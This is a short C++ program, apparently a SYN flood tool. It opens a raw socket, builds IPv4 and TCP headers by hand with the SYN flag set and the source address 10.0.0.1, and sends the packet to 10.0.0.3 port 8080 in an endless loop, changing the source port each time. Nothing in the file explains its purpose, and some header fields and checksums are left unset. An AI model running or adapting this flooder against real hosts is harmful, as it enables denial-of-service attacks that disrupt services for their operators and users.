#include<iostream>
#include<string.h> 
#include<sys/socket.h>
#include<netinet/tcp.h>   
#include<netinet/ip.h>    
#include <arpa/inet.h>
 
int main(int argc, char const *argv[])
{
    int sock = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    char datagram[4096];
    memset (datagram, 0, 4096); 
    struct iphdr *ipheader = (struct iphdr *) datagram;
    struct tcphdr *tcpheader = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in socket_in;
     
    socket_in.sin_family = AF_INET;
    socket_in.sin_port = htons(8080);
    socket_in.sin_addr.s_addr = inet_addr ("10.0.0.3");
  

    ipheader->ihl = 5;
    ipheader->version = 4;
    ipheader->protocol = IPPROTO_TCP;
    ipheader->saddr = inet_addr ("10.0.0.1");    
    ipheader->daddr = socket_in.sin_addr.s_addr;
          
    tcpheader->source = htons (1024);
    tcpheader->dest = htons (8080);
    tcpheader->doff = 5;      
    tcpheader->syn=1;

	int one = 1;
    const int *val = &one;
    if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        std::cout<<"Error setting IP_HDRINCL"<<std::endl;
        return -1;    
    }

    int counter = 0;
    while (1)
    {

        tcpheader->source = htons (counter++);
        if (sendto (sock,datagram, 128,0,(struct sockaddr *) &socket_in,sizeof(socket_in)) < 0)
        {
            std::cout<<"Could not send"<<std::endl;
        }
        else
        {
            std::cout<<"Send"<<std::endl;
        }
 }
     
    return 0;
}
